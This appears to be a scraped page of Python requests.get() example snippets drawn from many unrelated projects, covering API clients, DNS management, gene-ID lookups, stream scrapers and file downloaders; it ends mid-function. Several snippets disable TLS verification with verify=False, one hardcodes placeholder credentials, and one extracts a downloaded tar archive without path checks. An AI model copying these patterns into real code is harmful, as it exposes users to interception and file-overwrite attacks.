
Python requests.get() Examples

**************************************
def resolve_reference_http(cls, design_uri):
        """Retrieve design documents from http/https endpoints.

        Return a byte array of the response content. Support unsecured or
        basic auth

        :param design_uri: Tuple as returned by urllib.parse for the design reference
        """
        if design_uri.username is not None and design_uri.password is not None:
            response = requests.get(
                design_uri.geturl(),
                auth=(design_uri.username, design_uri.password),
                timeout=get_client_timeouts())
        else:
            response = requests.get(
                design_uri.geturl(), timeout=get_client_timeouts())

        return response.content 
**************************************
def getTicket():
    # put the ip address or dns of your apic-em controller in this url
    url = "https://" + controller + "/api/v1/ticket"

    #the username and password to access the APIC-EM Controller
    payload = {"username":"usernae","password":"password"}

    #Content type must be included in the header
    header = {"content-type": "application/json"}

    #Performs a POST on the specified url to get the service ticket
    response= requests.post(url,data=json.dumps(payload), headers=header, verify=False)

    #convert response to json format
    r_json=response.json()

    #parse the json to get the service ticket
    ticket = r_json["response"]["serviceTicket"]

    return ticket 
**************************************
def open_url(url: str) -> Iterator[BytesIO]:
    parsed_url = requests.utils.urlparse(url)
    if parsed_url.scheme == 'file':
        assert parsed_url.netloc == '', f'Bad file URL: {url}'
        with open(requests.utils.unquote(parsed_url.path), 'rb') as infile:
            yield infile
    elif parsed_url.scheme in ['http', 'https']:
        # verify=True is the default, but I want to be explicit about HTTPS,
        # since this function receives GPG key material.
        with requests.get(url, stream=True, verify=True) as r:
            r.raise_for_status()
            yield r.raw  # A file-like `io`-style object for the HTTP stream
            if r.raw.isclosed():   # Proxy for "all data was consumed"
                # Sadly, requests 2.x does not verify content-length :/
                # We could check r.raw.length_remaining, likely equivalent.
                actual_size = r.raw.tell()
                header_size = int(r.headers['content-length'])
                assert actual_size == header_size, (actual_size, header_size)
    else:  # pragma: no cover
        raise RuntimeError(f'Unknown URL scheme in {url}') 
**************************************
def __init__(self, url, method='get', data=None, params=None,
                 headers=None, content_type='application/json', **kwargs):
        self.url = url
        self.method = method
        self.params = params or {}
        self.kwargs = kwargs

        if not isinstance(headers, dict):
            headers = {}
        self.headers = CaseInsensitiveDict(headers)
        if content_type:
            self.headers['Content-Type'] = content_type
        if data:
            self.data = json.dumps(data)
        else:
            self.data = {} 
**************************************
def __call__(self, client, dnode):
        logger.info('Test download speed :  running...')
        start = time.clock()
        r = requests.get('http://{}'.format(dnode), stream=True)
        total_length = int(r.headers.get('content-length'))
        if total_length is None:
            logger.error("Empty file!")
        else:
            array_speed = []
            start_chunk = time.clock()
            for chunk in r.iter_content(1024):  # 1kB1024 1MB 1048576
                end_chunk = time.clock()
                delta = end_chunk - start_chunk
                start_chunk = end_chunk
                if delta <= 0:
                    break
                else:
                    array_speed.append(1//delta)  # kB / s

            end = time.clock()
            yield from self._queue.put(self.get_result(dnode, start, end, total_length, array_speed)) 
**************************************
def acceleration(self, array_speed):
        """Caculate acceleration.

        By get the highest speed in the first cycle.

        Args:
            array_speed (list): list download times for each 1024 Byte

        Returns:
            acceleration (kB/s) : the deviation between highest speed and first byte speed
        """

        if len(array_speed) == 0:
            return 0
        speed_before = array_speed[0]
        for speed in array_speed:
            if speed < speed_before:
                break
            else:
                speed_before = speed

        return speed_before - array_speed[0] 
**************************************
def get_by_url(url):
    # Get show data from svtplay.se.
    r = requests.get('%s?type=embed&output=json' % (url))
    r.raise_for_status()

    response_json = r.json()
    video = response_json.get('video')

    # Get the highest quality video stream.
    for vr in video.get('videoReferences'):
        if vr.get('playerType') == 'ios':
            unscrubbed_url = vr.get('url')
            try:
                # remove all getvars from link
                scrubbed_url = unscrubbed_url[:unscrubbed_url.index('.m3u8') + 5]
                return scrubbed_url
            except IndexError:
                if unscrubbed_url:
                    print('Stream url used old format without alt getvar. Trying old style...')
                    return unscrubbed_url
                else:
                    print('Empty url to stream. Exiting.') 
**************************************
def test_repomd(self):
        content = b'An abacus falls from a fig tree'
        timestamp = 1234567890
        with self.repo_server_thread({
            'repomd.xml': {
                'size': len(content),
                'build_timestamp': timestamp,
                'content_bytes': content,
            }
        }) as (host, port):
            req = requests.get(f'http://{host}:{port}/repomd.xml')
            req.raise_for_status()
            self.assertEqual(content, req.content)
            self.assertEqual(
                timestamp,
                email.utils.parsedate_to_datetime(req.headers['last-modified'])
                    .timestamp(),
            )
            self.assertEqual('text/xml', req.headers['content-type']) 
**************************************
def _check_bad_blob(self, bad_blob):
        with self.repo_server_thread({'bad_blob': bad_blob}) as (host, port):
            # Drive-by test of HEAD requests -- note that this doesn't
            # detect the error yet, so the next GET "succeeds".
            req_head = requests.head(f'http://{host}:{port}/bad_blob')
            req = requests.get(f'http://{host}:{port}/bad_blob')
            self.assertEqual(req_head.status_code, req.status_code)
            self.assertEqual(_no_date(req_head.headers), _no_date(req.headers))
            # You'd think that `requests` would error on this, but, no...
            # https://blog.petrzemek.net/2018/04/22/
            #   on-incomplete-http-reads-and-the-requests-library-in-python/
            self.assertEqual(200, req.status_code)
            self.assertLess(
                req.raw.tell(),  # Number of bytes that were read
                int(req.headers['content-length']),
            )
            # Ok, so we didn't get enough bytes, let's retry. This verifies
            # that the server memoizes integrity errors correctly.
            req = requests.get(f'http://{host}:{port}/bad_blob')
            self.assertEqual(500, req.status_code)
            self.assertIn(b'file_integrity', req.content)
            return req.content.decode() 
**************************************
def init_inventory_container(container,headers=None, org_name=None):
    
    initialize_config()
    
    headers = headers if headers else TSC_HEADERS
    org_name = org_name if org_name else ORG_NAME
    
    def _container_url(container_id):
            return 'https://secure.transcriptic.com/{}/samples/{}.json'.format(org_name, container_id)

    response = requests.get(_container_url(container.id), headers=headers, verify=False)
    response.raise_for_status()

    container_json = response.json()   
    
    container.cover = container_json['cover']
    
    for well in container.all_wells():
        init_inventory_well(well,container_json=container_json)
    
   
#@TODO: this needs to be mocked in tests since it hits the transcriptic api 
**************************************
def __init__(self, email: str, api_key: str, domain: str, proxied: bool):
        """
        Initialization. It will set the zone information of the domain for operation.
        It will also get dns records of the current zone.
        :param email:
        :param api_key:
        :param domain:
        :param proxied:
        """
        self.email = email
        self.api_key = api_key
        self.domain = domain
        self.proxied = proxied
        self.headers = {
            'X-Auth-Key': api_key,
            'X-Auth-Email': email
        }
        self.setup_zone() 
**************************************
def setup_zone(self):
        """
        Setup zone for current domain.
        It will also setup the dns records of the zone
        :return:
        """
        # Initialize current zone
        zones_content = self.request(self.api_url, 'get')
        try:
            if len(self.domain.split('.')) == 3:
                domain = self.domain.split('.', 1)[1]
            else:
                domain = self.domain
            zone = [zone for zone in zones_content['result'] if zone['name'] == domain][0]
        except IndexError:
            raise ZoneNotFound('Cannot find zone information for the domain {domain}.'
                               .format(domain=self.domain))
        self.zone = zone

        # Initialize dns_records of current zone
        dns_content = self.request(self.api_url + zone['id'] + '/dns_records', 'get')
        self.dns_records = dns_content['result'] 
**************************************
def convert_ensembl_to_entrez(self, ensembl):
        """Convert Ensembl Id to Entrez Gene Id"""
        if 'ENST' in ensembl:
            pass
        else:
            raise (IndexError)
        # Submit resquest to NCBI eutils/Gene database
        server = "http://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi?" + self.options + "&db=gene&term={0}".format(
            ensembl)
        r = requests.get(server, headers={"Content-Type": "text/xml"})
        if not r.ok:
            r.raise_for_status()
            sys.exit()
        # Process Request
        response = r.text
        info = xmltodict.parse(response)
        try:
            geneId = info['eSearchResult']['IdList']['Id']
        except TypeError:
            raise (TypeError)
        return geneId 
**************************************
def convert_hgnc_to_entrez(self, hgnc):
        """Convert HGNC Id to Entrez Gene Id"""
        entrezdict = {}
        server = "http://rest.genenames.org/fetch/hgnc_id/{0}".format(hgnc)
        r = requests.get(server, headers={"Content-Type": "application/json"})
        if not r.ok:
            r.raise_for_status()
            sys.exit()
        response = r.text
        info = xmltodict.parse(response)
        for data in info['response']['result']['doc']['str']:
            if data['@name'] == 'entrez_id':
                entrezdict[data['@name']] = data['#text']
            if data['@name'] == 'symbol':
                entrezdict[data['@name']] = data['#text']
        return entrezdict 
**************************************
def convert_uniprot_to_entrez(self, uniprot):
        """Convert Uniprot Id to Entrez Id"""
        # Submit request to NCBI eutils/Gene Database
        server = "http://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi?" + self.options + "&db=gene&term={0}".format(
            uniprot)
        r = requests.get(server, headers={"Content-Type": "text/xml"})
        if not r.ok:
            r.raise_for_status()
            sys.exit()
        # Process Request
        response = r.text
        info = xmltodict.parse(response)
        geneId = info['eSearchResult']['IdList']['Id']
        # check to see if more than one result is returned
        # if you have more than more result then check which Entrez Id returns the same uniprot Id entered.
        if len(geneId) > 1:
            for x in geneId:
                c = self.convert_entrez_to_uniprot(x)
                c = c.lower()
                u = uniprot.lower()
                if c == u:
                    return x
        else:
            return geneId 
**************************************
def resolve_reference_ucp(cls, design_uri):
        """Retrieve artifacts from a Airship service endpoint.

        Return a byte array of the response content. Assumes Keystone
        authentication required.

        :param design_uri: Tuple as returned by urllib.parse for the design reference
        """
        ks_sess = KeystoneUtils.get_session()
        (new_scheme, foo) = re.subn(r'^[^+]+\+', '', design_uri.scheme)
        url = urllib.parse.urlunparse(
            (new_scheme, design_uri.netloc, design_uri.path, design_uri.params,
             design_uri.query, design_uri.fragment))
        LOG.debug("Calling Keystone session for url %s" % str(url))
        resp = ks_sess.get(url, timeout=get_client_timeouts())
        if resp.status_code >= 400:
            raise errors.InvalidDesignReference(
                "Received error code for reference %s: %s - %s" %
                (url, str(resp.status_code), resp.text))
        return resp.content 
**************************************
def client():
    with vcr.use_cassette('tests/fixtures/vcr_cassettes/client.yaml'):
        request = requests.get(URL,
                            headers={
                                'Host': 'swapi.graphene-python.org',
                                'Accept': 'text/html',
                            })
        request.raise_for_status()
        csrf = request.cookies['csrftoken']

        return Client(
            transport=RequestsHTTPTransport(url=URL,
                                            cookies={"csrftoken": csrf},
                                            headers={'x-csrftoken':  csrf}),
            fetch_schema_from_transport=True
        ) 
**************************************
def __init__(self, name, site='https://roll20.net/compendium/dnd5e/'):
        self.name = name.rstrip().title()
        formatted_name = self.name.replace(' ', '_')
        url = site + formatted_name
        page = requests.get(url)
        if page.status_code != 200:
            raise IOError('{:s} not found at {:s}.'.format(name,
                                                           url))
        if 'marketplace' in page.url:
              raise IOError('{:s} not found at {:s}, '
                            'likely because this content is behind a paywall. '
                            'Encourage developer to add alternative back-ends to Roll20'.format(name, url))
        html = page.text
        soup = bs(html, 'html.parser')
        self.attributes = ({stringify(a.text):
                            stringify(a.find_next(attrs={'class':
                                                         'value'}).text)
                            for a in soup.find_all(attrs={'class':
                                                          'col-md-3 attrName'})})
        self.desc = '\n'.join([stringify(val.text)
                               for val in soup.find_all(id='origpagecontent',
                                                        attrs={'type':
                                                               'text/html'})]) 
**************************************
def str_attributes(self):
        res = ''
        for k in ['HP', 'AC', 'Speed', 'Challenge Rating']:
            res += k + ': ' + self.get(k, 'EMPTY') + '\n'
        res += '\n'
        for k in ['STR', 'DEX', 'CON', 'INT', 'WIS', 'CHA']:
            res += k + '\t'
        res += '\n'
        for k in ['STR', 'DEX', 'CON', 'INT', 'WIS', 'CHA']:
            s = self.get(k, None)
            res += '{:s} ({:s})\t'.format(s, score_to_mod(int(s)))
        res += '\n\n'
        for k in ['Type', 'Size', 'Alignment', 'Senses', 'Skills',
                  'Languages']:
            res += k + ': ' + self.get(k, 'EMPTY') + '\n'
        return res 
**************************************
def as_dungeonsheets_class(self):
        spell_name = self.name
        class_name = spell_name.replace(' ', '').replace('-', '')
        res = 'class {:s}(Spell):\n'.format(class_name)
        res += "    \"\"\"{:s}\n    \"\"\"\n".format(self.desc.replace('\n', '\n    '))
        res += "    name = \"{:s}\"\n".format(spell_name)
        res += "    level = {:d}\n".format(int(self.get('Level', -1)))
        res += "    casting_time = \"{:s}\"\n".format(self.get('Casting Time', '1 action'))
        res += "    casting_range = \"{:s}\"\n".format(self.get('Range', ''))
        str_components = self.get('Components', '').upper().split(' ')
        if len(str_components) == 0:
            res += "    components = ()\n"
        else:
            res += "    components = {:s}\n".format(str(tuple(str_components)))
        res += "    materials = \"\"\"{:s}\"\"\"\n".format(self.get('Material', ''))
        dur_text = "\"{:s}\"\n".format(self.get('Duration', 'Instantaneous'))
        dur_text = ("\"Concentration, {:s}".format(dur_text.lstrip('\"')) if
                    self.get('Concentration', '') else dur_text)
        duration = "    duration = " + dur_text
        res += duration
        res += "    ritual = {:}\n".format(bool(self.get('Ritual', '')))
        res += "    magic_school = \"{:s}\"\n".format(self.get('School', ''))
        res += "    classes = {:s}\n".format(str(tuple(self.get('Classes', '').split(', '))))
        return res + "\n" 
**************************************
def get_vmprofiles(self):
        url = 'https://%s/php/vmprofiles.php' % self.atdserver

        try:
            r = requests.get(url, headers=self.sessionhdr, verify=False)
        except Exception as e:
            error_info = 'Error getting vmprofiles:\n%s' % e
            return(0, error_info)

        if r.status_code == 200:
            server_info = json.loads(r.content)

            if server_info['success'] is True:
                return (1, server_info['results'])

            else:
                error_info = 'Error getting vmprofiles, check credentials or content type header'
                return (0, error_info)
        else:
            error_info = 'Error getting vmprofiles, status code: %d' % r.status_code
            return (0, error_info) 
**************************************
def getNetworkDevices(ticket):
    # URL for network device REST API call to get list of existing devices on the network.
    url = "https://" + controller + "/api/v1/network-device"

    #Content type must be included in the header as well as the ticket
    header = {"content-type": "application/json", "X-Auth-Token":ticket}

    # this statement performs a GET on the specified network-device url
    response = requests.get(url, headers=header, verify=False)

    # json.dumps serializes the json into a string and allows us to
    # print the response in a 'pretty' format with indentation etc.
    print ("Network Devices = ")
    print (json.dumps(response.json(), indent=4, separators=(',', ': ')))

  #convert data to json format.
    r_json=response.json()

  #Iterate through network device data and print the id and series name of each device
    for i in r_json["response"]:
        print(i["id"] + "   " + i["series"])

#call the functions 
**************************************
def __call__(self, client, dnode):
        logger.info('Caculating time for download first byte...')
        r = requests.get('http://{}'.format(dnode), stream=True)
        total_length = int(r.headers.get('content-length'))
        if total_length is None:
            logger.info("empty file!")
        else:
            start_chunk = time.clock()
            for chunk in r.iter_content(1024):  # 1kB1024 1MB 1048576
                end_chunk = time.clock()
                break

            delta = end_chunk - start_chunk  # time to first byte
            yield from self._queue.put(self.get_result(dnode, delta)) 
**************************************
def get_client_id():
    r = requests.get(CDN_BASE + 'global.js')
    if r.status_code >= 400:
        raise Exception('Error fetching global.js script.')

    # Find the client ID with a regex that totally wont match anything else /s
    client_ids = re.findall(r'clientID:"(\w*)"', r.text)
    if len(client_ids) != 1:
        raise Exception(
            'Error finding client ID in twitch global-frontend script. Got {}'.format(client_ids))
    return client_ids[0] 
**************************************
def get_token_and_signature(channel, client_id):
    url = TOKEN_API.format(channel=channel)
    headers = {'Client-ID': client_id}
    r = requests.get(url, headers=headers)
    if r.status_code >= 400:
        raise Exception('Error requesting token from twitch: {}'.format(r.text))
    data = r.json()
    return data['token'], data['sig'] 
**************************************
def get_live_stream(channel):
    client_id = get_client_id()
    token, sig = get_token_and_signature(channel, client_id)
    url = USHER_API.format(channel=channel, sig=sig, token=token, random=random.randint(0, 1E7))
    r = requests.get(url)
    m3u8_obj = m3u8.loads(r.text)
    return m3u8_obj 
**************************************
def get_api_data(self):
        """
        Gets json file containing server information

        :return: server information in json format
        """
        try:
            resp = requests.get(api, timeout=5)
            if resp.status_code == requests.codes.ok:
                return resp.json()
            else:
                self.statusbar.showMessage("Get API failed", 2000)
        except Exception as ex:
            self.statusbar.showMessage("Get API failed", 2000) 
**************************************
def get_ovpn(self):
        """
        Gets ovpn file from nord servers and saves it to a temporary location
        """
        # https://downloads.nordcdn.com/configs/files/ovpn_udp/servers/sg173.nordvpn.com.udp.ovpn
        self.ovpn_path = None
        ovpn_url = None
        udp_url = 'https://downloads.nordcdn.com/configs/files/ovpn_udp/servers/'
        tcp_url = 'https://downloads.nordcdn.com/configs/files/ovpn_tcp/servers/'
        udp_xor_url = 'https://downloads.nordcdn.com/configs/files/ovpn_xor_udp/servers/'
        tcp_xor_url = 'https://downloads.nordcdn.com/configs/files/ovpn_xor_tcp/servers/'

        if (self.server_type_select.currentText() == 'Obfuscated Server') and (self.connection_type_select.currentText() == 'UDP'):
            ovpn_url = udp_xor_url
        elif (self.server_type_select.currentText() == 'Obfuscated Server') and (self.connection_type_select.currentText() == 'TCP'):
            ovpn_url = tcp_xor_url
        elif (self.server_type_select.currentText() != 'Obfuscated Server') and (self.connection_type_select.currentText() == 'UDP'):
            ovpn_url = udp_url
        elif (self.server_type_select.currentText() != 'Obfuscated Server') and (self.connection_type_select.currentText() == 'TCP'):
            ovpn_url = tcp_url

        if self.connection_type_select.currentText() == 'UDP':
            filename = self.domain_list[self.server_list.currentRow()] + '.udp.ovpn'
            ovpn_file = requests.get(ovpn_url + filename, stream=True)
            if ovpn_file.status_code == requests.codes.ok:
                self.ovpn_path = os.path.join(self.config_path, filename)
                with open(self.ovpn_path, 'wb') as out_file:
                    shutil.copyfileobj(ovpn_file.raw, out_file)
            else: self.statusbar.showMessage('Error fetching configuration files', 2000)

        elif self.connection_type_select.currentText() == 'TCP':
            filename = self.domain_list[self.server_list.currentRow()] + '.tcp.ovpn'
            ovpn_file = requests.get(ovpn_url + filename, stream=True)
            if ovpn_file.status_code == requests.codes.ok:
                self.ovpn_path = os.path.join(self.config_path, filename)
                with open(self.ovpn_path, 'wb') as out_file:
                    shutil.copyfileobj(ovpn_file.raw, out_file)
            else: self.statusbar.showMessage('Error fetching configuration files', 2000)

        self.server_list.setFocus() 
**************************************
def updateFactorio():
	

	file_name = "/tmp/latestFactorio.tar.gz"
	print("Downloading %s" % file_name)

	r = requests.get(DOWNLOADURL, stream=True)
	total_length = int(r.headers.get('content-length'))

	if not os.path.isfile(file_name) or total_length != os.path.getsize(file_name):
		with open(file_name, 'wb') as f:
			for chunk in progress.bar(r.iter_content(chunk_size=1024), expected_size=(total_length/1024) + 1): 
				if chunk:
					f.write(chunk)
					f.flush()
			#os.chmod(file_name, stat.S_IWUSR | stat.S_IRUSR)
	else:
		print("File already exists and file sizes match. Skipping download.")	

	if os.access(FACTORIOPATH, os.W_OK):
		if os.path.isfile(file_name):
			tar = tarfile.open(file_name, "r:gz")
			tar.extractall(path="/tmp")
			tar.close()

			copytree("/tmp/factorio", FACTORIOPATH)
			print("Success.")
		else:
			print("Help! Can't find %s, but I should have!" % (file_name))
			sys.exit(1)			
	else:
		print("Can't write to %s" % (FACTORIOPATH))
		sys.exit(1) 
**************************************
def get_dict_optional_value(d,keys_to_try_in_order, default_value=None):
    """
    Tries each key in order, if not value is found, returns default_value
    """
    
    for key in keys_to_try_in_order:
        if key in d and d.get(key):
            return d[key]
        
    return default_value 
**************************************
def get_melting_temp(dna_sequence, oligo_concentration_uM,
                     pcr_settings='q5'):
    global IDT_COOKIE
    
    #@TODO: update this to use http://tmcalculator.neb.com/#!/ since its probably accounting for the salt concentration in the buffer
    
    if not IDT_COOKIE:
        r = requests.get('http://www.idtdna.com/calc/analyzer',allow_redirects=False)
        IDT_COOKIE = r.cookies['ASP.NET_SessionId']       
        
    headers = {"content-type":'application/json','Cookie':'ASP.NET_SessionId=%s'%IDT_COOKIE}
    
    idt_response = requests.post('https://www.idtdna.com/calc/analyzer/home/analyze',json={
        "settings": {
            "Sequence": dna_sequence,
            "NaConc": 0,
            "MgConc": 2,
            "DNTPsConc": 5, 
            "OligoConc": oligo_concentration_uM,
            "NucleotideType": "DNA"
        }
    }, verify=False
    ,headers=headers)    
    
    idt_response.raise_for_status()
    
    return idt_response.json()['MeltTemp'] 
**************************************
def do(self):
        # logging.debug("{} {}: \n\tHeaders {}, \n\tData {}, \n\tParams {}, \n\tOther: {}".format(
        #     self.method.upper(), self.url, self.headers,
        #     self.data, self.params, self.kwargs
        # ))
        result = self.methods.get(self.method)(
            url=self.url, headers=self.headers,
            data=self.data, params=self.params,
            **self.kwargs
        )
        return result 
**************************************
def do(self, api_name=None, pk=None, method='get', use_auth=True,
           data=None, params=None, content_type='application/json', **kwargs):

        if api_name in API_URL_MAPPING:
            path = API_URL_MAPPING.get(api_name)
            if pk and '%s' in path:
                path = path % pk
        else:
            path = api_name

        request_headers = kwargs.get('headers', {})
        default_headers = self.default_headers or {}
        headers = {k: v for k, v in default_headers.items()}
        headers.update(request_headers)
        kwargs['headers'] = headers
        url = self.endpoint.rstrip('/') + path
        req = HttpRequest(url, method=method, data=data,
                          params=params, content_type=content_type,
                          **kwargs)
        if use_auth:
            if not self.auth:
                msg = 'Authentication required, but not provide'
                logger.error(msg)
                raise RequestError(msg)
            else:
                self.auth.sign_request(req)

        try:
            resp = req.do()
        except (requests.ConnectionError, requests.ConnectTimeout) as e:
            msg = "Connect endpoint {} error: {}".format(self.endpoint, e)
            logger.error(msg)
            raise RequestError(msg)

        return self.clean_result(resp) 
**************************************
def get(self, *args, **kwargs):
        kwargs['method'] = 'get'
        return self.do(*args, **kwargs) 
**************************************
def create_record(self, dns_type, name, content, **kwargs):
        """
        Create a dns record
        :param dns_type:
        :param name:
        :param content:
        :param kwargs:
        :return:
        """
        data = {
            'type': dns_type,
            'name': name,
            'content': content
        }
        if kwargs.get('ttl') and kwargs['ttl'] != 1:
            data['ttl'] = kwargs['ttl']
        if kwargs.get('proxied') is True:
            data['proxied'] = True
        else:
            data['proxied'] = False
        content = self.request(
            self.api_url + self.zone['id'] + '/dns_records',
            'post',
            data=data
        )
        print('DNS record successfully created')
        return content['result'] 
**************************************
def update_record(self, dns_type, name, content, **kwargs):
        """
        Update dns record
        :param dns_type:
        :param name:
        :param content:
        :param kwargs:
        :return:
        """
        record = self.get_record(dns_type, name)
        data = {
            'type': dns_type,
            'name': name,
            'content': content
        }
        if kwargs.get('ttl') and kwargs['ttl'] != 1:
            data['ttl'] = kwargs['ttl']
        if kwargs.get('proxied') is True:
            data['proxied'] = True
        else:
            data['proxied'] = False
        content = self.request(
            urllib.parse.urljoin(self.api_url, self.zone['id'] + '/dns_records/' + record['id']),
            'put',
            data=data
        )
        print('DNS record successfully updated')
        return content['result'] 
**************************************
def search(self, type, q, territory='TW'):
        response = requests.get(self.API_BASE_URL + 'search', params={'type': type, 'q': q, 'territory': territory},
                                headers={'Authorization': 'Bearer ' + self.token})
        response.raise_for_status()
        response_json = response.json()

        if type == 'artist':
            return response_json['artists']['data'][0]['url']
        else:
            id = response_json[type + 's']['data'][0]['id']
            return 'https://widget.kkbox.com/v1/?id=' + id \
                   + '&type=' + ('song' if type == 'track' else type) 
**************************************
def _get_cache_stale_secs(cache_stale=None):
    # overrides config
    caching_val = config.CONFIG.parser.get('cache', 'normal')
    if caching_val in ('never', 'false', 'False', 'off', 'Off'):
        return 0
    if caching_val in ('test', 'forever'):
        return CACHE_FOREVER
    if cache_stale is None:
        return 0
    return cache_stale 
**************************************
def request_json(url, output_filename=None, cache_stale=None):
    """Sends a request expecting a json-formatted response.
    If output_filename is given, then the output is saved to file.
    This also enables basic caching, where cache_stale is the number of seconds
    since file is last modified before the cached file is considered stale (0 means disable the cache).
    """
    cache_stale = _get_cache_stale_secs(cache_stale)
    # Guard against very long filenames:
    if output_filename and len(output_filename) >= MAX_CACHE_FILENAME_LEN:
        output_filename = output_filename[0:MAX_CACHE_FILENAME_LEN-1]
    if output_filename and cache_stale:
        if output_filename in CACHE:
            return CACHE[output_filename]
        json_file = os.path.join(_get_cachedir(), '{}.json'.format(output_filename))
        if os.path.exists(json_file) and (int(time.time()) - os.path.getmtime(json_file) < cache_stale):
            with open(json_file) as jfh:
                CACHE[output_filename] = json.load(jfh)
            if config.DEBUG:
                LOG.info('Loaded from cache: %s', output_filename)
            return CACHE[output_filename]

    LOG.debug('Getting url=%s ...', url)
    headers = {
        'User-Agent': config.CONFIG.ua_iphone,
        'Connection': 'close'
    }
    util.log_http(url, 'get', headers, sys._getframe().f_code.co_name)
    response = requests.get(url, headers=headers, verify=config.VERIFY_SSL)
    response.raise_for_status()

    # Note: this fails on windows in some cases https://github.com/kennethreitz/requests-html/issues/171
    if output_filename is not None or (config.DEBUG and config.SAVE_JSON_FILE):
        json_file = os.path.join(_get_cachedir(), '{}.json'.format(output_filename))
        with open(json_file, 'w', encoding='utf-8') as out:  # write date to json_file
            out.write(response.text)
    if cache_stale:
        LOG.debug('Caching url=%s, filename=%s', url, output_filename)
        CACHE[output_filename] = response.json()
        return CACHE[output_filename]
    return response.json() 
**************************************
def get_attrib(self, et_node, prefixed_attrib):
        """Get a prefixed attribute like 'rdf:resource' from ET node."""
        prefix, attrib = prefixed_attrib.split(':')
        return et_node.get('{{{0}}}{1}'.format(self.namespaces[prefix],
                                               attrib)) 
**************************************
def __init__(self, namespaces=None, cc_resolver=None, source=None):
        """Init the remote loader."""
        super(RemoteFundRefLoader, self).__init__(
            namespaces=namespaces, cc_resolver=cc_resolver)
        self.source = source or \
            current_app.config['OPENAIRE_FUNDREF_ENDPOINT']
        headers = {"Content-Type": "application/rdf+xml"}
        obj = requests.get(self.source, stream=True, headers=headers)
        funders_xml = obj.text.encode('utf-8')
        self.doc_root = ET.fromstring(funders_xml) 
**************************************
def resolve_by_id(self, funder_id):
        """Resolve the funder from the OpenAIRE funder id.

        If funder_id can be resolved, return a URI otherwise return None.
        """
        return self.data.get(funder_id) 
**************************************
def resolve_by_oai_id(self, oai_id):
        """Resolve the funder from the OpenAIRE OAI record id.

        Hack for when funder is not provided in OpenAIRE.
        """
        if oai_id.startswith('oai:dnet:'):
            oai_id = oai_id[len('oai:dnet:'):]
        prefix = oai_id.split("::")[0]
        suffix = prefix.replace("_", "").upper()
        oaf = "{0}::{1}".format(prefix, suffix)
        return self.data.get(oaf) 
**************************************
def resolve_by_doi(self, doi):
        """Resolve a DOI to an OpenAIRE id."""
        return self.inverse_data.get(doi) 
**************************************
def forward(self, text):

        '''
        In PyTorch RNNs want the input with batch dim second, CNNs want the batch dim first
        we permute the input to make it the right shape for the CNN
        '''
        text = text.permute(1, 0)

        # Text passed through embedding layer to get embeddings
        embedded = self.embedding(text)

        '''
        A conv layer wants the second dim of the input to be a channel dim
        text does not have a channel dim, so the tensor is unsqueezed to create one
        '''
        embedded = embedded.unsqueeze(1)

        # Iterates through the list of conv layers applying each conv layer to get list of conv outputs
        conved = [F.relu(conv(embedded)).squeeze(3) for conv in self.convs]

        '''
        Conv outputs are passed through a max pooling that takes the maximum value over a dimension
        the idea being that the "maximum value" is the most important feature for determining the sentiment
        which corresponds to the most important n-gram in the review
        '''
        pooled = [F.max_pool1d(conv, conv.shape[2]).squeeze(2) for conv in conved]

        '''
        The model has 100 filters of 3 different sizes, therefore 300 n-grams that could be important
        which we concatenate into a single vector and pass through a dropout layer and finally a linear layer
        (NOTE: dropout is set to 0 during inference time)
        '''
        cat = self.dropout(torch.cat(pooled, dim = 1))

        # passed through linear layer to make predictions
        return self.fc(cat) 
**************************************
def get_soup(any_url):
    # 传入链接
    # 返回BeautifulSoup对象
    result = requests.get(any_url, headers=header[random.randint(0, 4)])
    html_doc = result.content
    try:
        html_doc = html_doc.decode('utf-8')
    except UnicodeDecodeError:
        html_doc = html_doc.decode('gbk')
    soup = BeautifulSoup(html_doc, 'html.parser')
    return soup 
**************************************
def get_soup(any_url):
    # 传入链接
    # 返回BeautifulSoup对象
    result = requests.get(any_url, headers=header[random.randint(0, 4)])
    html_doc = result.content
    try:
        html_doc = html_doc.decode('utf-8')
    except UnicodeDecodeError:
        html_doc = html_doc.decode('gbk')
    soup = BeautifulSoup(html_doc, 'html.parser')
    return soup 
**************************************
def get_soup(any_url):
    # 传入链接
    # 返回BeautifulSoup对象
    result = requests.get(any_url, headers=header[random.randint(0, 4)])
    html_doc = result.content
    try:
        html_doc = html_doc.decode('utf-8')
    except UnicodeDecodeError:
        html_doc = html_doc.decode('gbk')
    soup = BeautifulSoup(html_doc, 'html.parser')
    return soup 
**************************************
def nodeLatestVersion(dependency, project_id):
    r = requests.get('%s%s/latest' % (app.config['NPM_REGISTRY'], dependency))
    latestVersion = r.json().get('version')

    try:
        dep = ProjectDependency.by_project(project_id, dependency)
        dep.latest_version = latestVersion
        if LooseVersion(dep.actual_version) < LooseVersion(latestVersion):
            dep.status = 'ko'
        else:
            dep.status = 'ok'
        db.session.commit()
    except Exception, e:
        app.logger.error(e)
        db.session.rollback() 
**************************************
def nodeDepsFetcher(project_id):
    # Get dependencies from package.json
    project = git.getproject(project_id)

    depFileEncoded = git.getfile(project_id, 'package.json',
                                 project['default_branch'])

    # Decode from base64
    deps = json.loads(depFileEncoded.get('content').decode('base64'))

    mainDeps = deps.get('dependencies')
    devDeps = deps.get('devDependencies')

    # Insert in project_dependency
    # TODO create single function for that
    for mDep, mVersion in list(mainDeps.items()):
        mdep, created = get_or_create(db.session, ProjectDependency,
                                      project_id=project_id, name=mDep,
                                      actual_version=mVersion)

        if not created:
            app.logger.info('[%s] Dep %s already exist' % (project_id, mDep))

        db.session.commit()
        nodeLatestVersion(mDep, project_id)

    for devDep, devVersion in list(devDeps.items()):
        ddep, created = get_or_create(db.session, ProjectDependency,
                                      project_id=project_id, name=devDep,
                                      actual_version=devVersion, dev=True)

        if not created:
            app.logger.info('[%s] Dev dep %s already exist' %
                            (project_id, devDep))

        db.session.commit()
        nodeLatestVersion(devDep, project_id)
    return True 
**************************************
def PS1cutouts(ra,dec,filt):

    print '\nSearching for PS1 images of field...\n'

    ps1_url = 'http://ps1images.stsci.edu/cgi-bin/ps1filenames.py?'

    ps1_url += '&ra='+str(ra)
    ps1_url += '&dec='+str(dec)
    ps1_url += '&filters='+filt

    ps1_im = requests.get(ps1_url)

    try:
        image_name = ps1_im.text.split()[17]

        print 'Image found: ' + image_name + '\n'

        cutout_url = 'http://ps1images.stsci.edu/cgi-bin/fitscut.cgi?&filetypes=stack&size=2500'

        cutout_url += '&ra='+str(ra)
        cutout_url += '&dec='+str(dec)
        cutout_url += '&filters='+filt
        cutout_url += '&format=fits'
